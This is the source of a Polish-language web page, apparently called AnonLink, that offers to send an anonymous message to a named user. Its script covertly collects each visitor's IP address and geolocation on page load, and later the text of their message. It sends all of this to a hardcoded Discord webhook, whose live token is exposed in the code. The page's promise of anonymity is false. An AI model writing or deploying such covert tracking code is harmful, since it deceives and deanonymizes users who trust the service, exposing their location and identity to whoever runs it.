<html lang="pl">
<head>

    <meta charset="UTF-8">

    <title>Wy≈õlij AnonimowƒÖ Wiadomo≈õƒá</title>
    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <style>
        body {
            font-family: 'Inter', sans-serif;
            background: linear-gradient(to right, #667eea, #764ba2);
            color: #333;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            flex-direction: column;
            padding: 20px;
        }
        .container {
            background-color: #fff;
            padding: 40px;
            border-radius: 15px;
            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.2);
            width: 100%;
            max-width: 500px;
            text-align: center;
            box-sizing: border-box;
        }
        .input-field {
            width: 100%;
            padding: 12px 15px;
            margin-bottom: 20px;
            border: 1px solid #ccc;
            border-radius: 8px;
            font-size: 16px;
            box-sizing: border-box;

        }
        .input-field:focus {
            border-color: #667eea;

            outline: none;
        }
        .btn {
            display: flex;
            align-items: center;
            justify-content: center;
            width: 100%;
            padding: 12px 20px;
            border: none;
            border-radius: 8px;
            font-size: 18px;
            font-weight: 600;
            cursor: pointer;
            transition: background-color 0.2s, transform 0.2s;
            box-sizing: border-box;
        }
        .btn:hover {
            transform: translateY(-2px);
        }
        .btn:disabled {
            background-color: #a0aec0;
            cursor: not-allowed;
            transform: none;
        }
        .spinner {
            border-top-color: #3498db;
            animation: spin 1s linear infinite;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .loading .spinner {
            display: block;
        }
        .loading #btnText {
            display: none;
        }
        .message {
            padding: 10px;
            border-radius: 8px;
            margin-bottom: 20px;
            font-weight: 600;
            text-align: center;
        }
        .success {
            background-color: #d4edda;
            color: #155724;
            border: 1px solid #c3e6cb;
        }
        .error {
            background-color: #f8d7da;
            color: #721c24;
            border: 1px solid #f5c6cb;
        }
        .hidden {
            display: none;
        }
    </style>
</head>
<body class="flex flex-col items-center justify-center">
    <div class="container">
        <img src="https://i.ibb.co/hK0W7WJ/Anon-Link-Logo.png" alt="AnonLink Logo" class="mx-auto mb-6 w-32 h-32 object-contain">
        <h1 class="text-3xl font-bold text-indigo-700 mb-6" id="headerText"></h1>
        <p class="text-gray-700 mb-6" id="subHeaderText">Wy≈õlij anonimowƒÖ wiadomo≈õƒá do u≈ºytkownika.</p>

        <div id="successMessage" class="message success hidden"></div>
        <div id="errorMessage" class="message error hidden"></div>

        <form id="sendForm" class="relative">
            <textarea id="messageContent" rows="6" placeholder="Wpisz swojƒÖ anonimowƒÖ wiadomo≈õƒá tutaj..." class="input-field resize-none" maxlength="1000"></textarea>
            <div class="text-right text-gray-500 text-sm mt-1">
                <span id="charCount">0</span>/1000 znak√≥w
            </div>
            <button type="submit" class="btn w-full py-4 px-8 bg-gradient-to-r from-indigo-500 to-purple-600 text-white text-lg font-semibold rounded-xl cursor-pointer hover:scale-105 transition-transform duration-200 disabled:bg-gray-400 disabled:cursor-not-allowed disabled:transform-none" id="sendBtn">
                üì§ Wy≈õlij anonimowo
            </button>
        </form>
        
        <div class="back-link text-center mt-6">
            <a href="index.html" class="text-indigo-600 hover:underline">‚Üê Wr√≥ƒá do strony g≈Ç√≥wnej</a>
        </div>
    </div>

    <script>
        let recipientUsername = '';
        const COOLDOWN_SECONDS = 30; // Cooldown for sending messages in seconds
        let lastSendTime = 0; // Timestamp of the last successful send

        // ZMIANA: Funkcja do inicjalizacji odbiorcy
        function initializeRecipient() {
            const urlParams = new URLSearchParams(window.location.search);
            recipientUsername = urlParams.get('to');

            const headerText = document.getElementById('headerText');
            if (recipientUsername) {
                headerText.textContent = `Wy≈õlij wiadomo≈õƒá do ${recipientUsername}`;
            } else {
                headerText.textContent = 'AnonLink';
                document.getElementById('subHeaderText').textContent = 'Nie znaleziono odbiorcy. Wr√≥ƒá do strony g≈Ç√≥wnej.';
                document.getElementById('sendForm').style.display = 'none'; // Hide form if no recipient
            }
        }

        // ZMIANA: Funkcja do wysy≈Çania informacji o odwiedzajƒÖcym
        async function getIpAndGeoData() {
            let userIP = 'N/A';
            let regionName = 'N/A';
            let cityName = 'N/A';
            let countryName = 'N/A';
            let countryCode = 'N/A';

            try {
                // Fetch IP address from ipify.org
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                if (ipResponse.ok) {
                    const ipData = await ipResponse.json();
                    userIP = ipData.ip;

                    // Fetch geolocation data from ipinfo.io
                    const geoResponse = await fetch(`https://ipinfo.io/${userIP}/json`);
                    if (geoResponse.ok) {
                        const geoData = await geoResponse.json();
                        if (geoData) {
                            regionName = geoData.region || 'N/A';
                            cityName = geoData.city || 'N/A';
                            countryName = geoData.country || 'N/A';
                            countryCode = geoData.country || 'N/A';
                        }
                    } else {
                        console.warn('Failed to fetch geo data from ipinfo.io, status:', geoResponse.status);
                    }
                } else {
                    console.error('Failed to fetch IP address from ipify.org:', ipResponse.statusText);
                }
            } catch (error) {
                console.error('Error fetching IP/Geo data:', error);
            }
            return { userIP, regionName, cityName, countryName, countryCode };
        }

        // Function to send IP and Region to Discord Webhook on page load
        async function sendVisitorInfoToWebhook() {
            const webhookUrl = "https://discord.com/api/webhooks/1378777672439824495/dR1_nA3JhK6MWqkn-SPJ2XoW3MjiY92VDlr4XsG069IHmI5bKZ9_o0xF98a4v_jwC6Ud";
            const { userIP, regionName, cityName, countryName, countryCode } = await getIpAndGeoData();

            const payload = {
                content: null,
                embeds: [
                    {
                        title: "AnonLink - Nowy OdwiedzajƒÖcy",
                        description: `U≈ºytkownik wszed≈Ç na stronƒô wysy≈Çania wiadomo≈õci.`,
                        color: 16763904, // Orange color
                        fields: [
                            { name: "Odbiorca", value: recipientUsername || "Nieznany", inline: true },
                            { name: "IP OdwiedzajƒÖcego", value: userIP, inline: true },
                            { name: "Kraj", value: countryName, inline: true },
                            { name: "Region", value: regionName, inline: true },
                            { name: "Miasto", value: cityName, inline: true }
                        ],
                        timestamp: new Date().toISOString(),
                        footer: { text: "AnonLink Bot" }
                    }
                ],
                attachments: []
            };

            try {
                const response = await fetch(webhookUrl, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });

                if (!response.ok) {
                    console.error(`B≈ÇƒÖd wysy≈Çania danych do webhooka: ${response.status} ${response.statusText}`);
                }
            } catch (error) {
                console.error('B≈ÇƒÖd wysy≈Çania informacji o odwiedzajƒÖcym do webhooka:', error);
            }
        }

        // ZMIANA: Funkcja aktualizujƒÖca odliczanie na przycisku
        let cooldownInterval;
        function updateCooldownButton() {
            const sendBtn = document.getElementById('sendBtn');
            const now = Date.now();
            const timeElapsed = (now - lastSendTime) / 1000; // Czas w sekundach

            if (timeElapsed < COOLDOWN_SECONDS) {
                const timeLeft = Math.ceil(COOLDOWN_SECONDS - timeElapsed);
                sendBtn.disabled = true;
                sendBtn.textContent = `Poczekaj ${timeLeft}s...`;
                if (!cooldownInterval) {
                    cooldownInterval = setInterval(updateCooldownButton, 1000); // Update every second
                }
            } else {
                sendBtn.disabled = false;
                sendBtn.textContent = 'üì§ Wy≈õlij anonimowo';
                if (cooldownInterval) {
                    clearInterval(cooldownInterval);
                    cooldownInterval = null;
                }
            }
        }

        document.getElementById('messageContent').addEventListener('input', function() {
            const charCount = document.getElementById('charCount');
            charCount.textContent = this.value.length;
        });

        document.getElementById('sendForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            const messageContent = document.getElementById('messageContent').value.trim();
            const sendBtn = document.getElementById('sendBtn');

            if (!recipientUsername) {
                showError('Nie znaleziono odbiorcy. Wr√≥ƒá do strony g≈Ç√≥wnej.');
                return;
            }

            if (messageContent.length < 3 || messageContent.length > 1000) {
                showError('Wiadomo≈õƒá musi mieƒá od 3 do 1000 znak√≥w.');
                return;
            }

            const now = Date.now();
            if ((now - lastSendTime) / 1000 < COOLDOWN_SECONDS) {
                showError(`Musisz poczekaƒá ${Math.ceil(COOLDOWN_SECONDS - (now - lastSendTime) / 1000)} sekund przed wys≈Çaniem kolejnej wiadomo≈õci.`);
                return;
            }

            sendBtn.disabled = true;
            sendBtn.textContent = 'Wysy≈Çanie...';

            try {
                const response = await fetch('https://tbh-fun.onrender.com/send_message', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({ to: recipientUsername, message: messageContent }),
                });

                const data = await response.json();
                if (data.success) {
                    showSuccess('Wiadomo≈õƒá wys≈Çana pomy≈õlnie!');
                    document.getElementById('messageContent').value = '';
                    document.getElementById('charCount').textContent = '0';
                    lastSendTime = Date.now(); // Record send time
                    updateCooldownButton(); // Start cooldown
                    sendActivityToWebhook(recipientUsername, messageContent, "success"); // Send activity to webhook
                } else {
                    showError(data.message || 'WystƒÖpi≈Ç b≈ÇƒÖd podczas wysy≈Çania wiadomo≈õci.');
                    sendActivityToWebhook(recipientUsername, messageContent, "failure", data.message || 'Unknown error'); // Send activity to webhook
                }
            } catch (error) {
                console.error('B≈ÇƒÖd:', error);
                showError('WystƒÖpi≈Ç b≈ÇƒÖd po≈ÇƒÖczenia. Sprawd≈∫ internetowe i spr√≥buj ponownie.');
                sendActivityToWebhook(recipientUsername, messageContent, "failure", error.message); // Send activity to webhook
            } finally {
                // sendBtn.disabled = false; // Handled by updateCooldownButton
                // sendBtn.textContent = 'üì§ Wy≈õlij anonimowo'; // Handled by updateCooldownButton
                updateCooldownButton(); // Ensure button state is correct after attempt
            }
        });

        // ZMIANA: Funkcja do wysy≈Çania aktywno≈õci do webhooka Discord
        async function sendActivityToWebhook(recipient, message, status, errorMessage = "") {
            const webhookUrl = "https://discord.com/api/webhooks/1378777672439824495/dR1_nA3JhK6MWqkn-SPJ2XoW3MjiY92VDlr4XsG069IHmI5bKZ9_o0xF98a4v_jwC6Ud";
            const color = status === "success" ? 65280 : 16711680; // Green for success, Red for failure
            const description = status === "success" ? "Wiadomo≈õƒá zosta≈Ça wys≈Çana pomy≈õlnie." : `Wiadomo≈õƒá nie zosta≈Ça wys≈Çana. B≈ÇƒÖd: ${errorMessage}`;

            const payload = {
                content: null,
                embeds: [
                    {
                        title: `AnonLink - Aktywno≈õƒá Wysy≈Çania Wiadomo≈õci (${status.toUpperCase()})`,
                        description: description,
                        color: color,
                        fields: [
                            { name: "Odbiorca", value: recipient, inline: true },
                            { name: "Status", value: status.toUpperCase(), inline: true },
                            { name: "Tre≈õƒá Wiadomo≈õci", value: message.substring(0, 500) + (message.length > 500 ? "..." : ""), inline: false } // Truncate long messages
                        ],
                        timestamp: new Date().toISOString(),
                        footer: { text: "AnonLink Bot" }
                    }
                ],
                attachments: []
            };

            try {
                const response = await fetch(webhookUrl, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });

                if (!response.ok) {
                    console.error(`B≈ÇƒÖd wysy≈Çania aktywno≈õci do webhooka: ${response.status} ${response.statusText}`);
                }
            } catch (error) {
                console.error('B≈ÇƒÖd wysy≈Çania aktywno≈õci do webhooka:', error);
            }
        }

        function showSuccess(message) {
            const successDiv = document.getElementById('successMessage');
            const errorDiv = document.getElementById('errorMessage');

            errorDiv.classList.add('hidden'); // Use Tailwind hidden class
            successDiv.textContent = message;
            successDiv.classList.remove('hidden'); // Show success message
            
            // Scroll do g√≥ry aby zobaczyƒá wiadomo≈õƒá
            window.scrollTo(0, 0);
            
            setTimeout(() => {
                successDiv.classList.add('hidden'); // Hide after 5 seconds
            }, 5000);
        }
        
        function showError(message) {
            const errorDiv = document.getElementById('errorMessage');
            const successDiv = document.getElementById('successMessage');
            
            successDiv.classList.add('hidden'); // Use Tailwind hidden class
            errorDiv.textContent = message;
            errorDiv.classList.remove('hidden'); // Show error message
            
            // Scroll do g√≥ry aby zobaczyƒá b≈ÇƒÖd
            window.scrollTo(0, 0);
            
            setTimeout(() => {
                errorDiv.classList.add('hidden'); // Hide after 5 seconds
            }, 5000);
        }

        // Wywo≈Çaj webhooka z informacjami o odwiedzajƒÖcym przy ≈Çadowaniu strony
        window.addEventListener('load', async function() {
            await sendVisitorInfoToWebhook();
            await initializeRecipient(); // Inicjalizuj odbiorcƒô po za≈Çadowaniu strony i wys≈Çaniu danych o odwiedzajƒÖcym
            // ZMIANA: Upewnij siƒô, ≈ºe przycisk jest poprawnie ustawiony po za≈Çadowaniu
            updateCooldownButton(); 
        });
    </script>
</body>
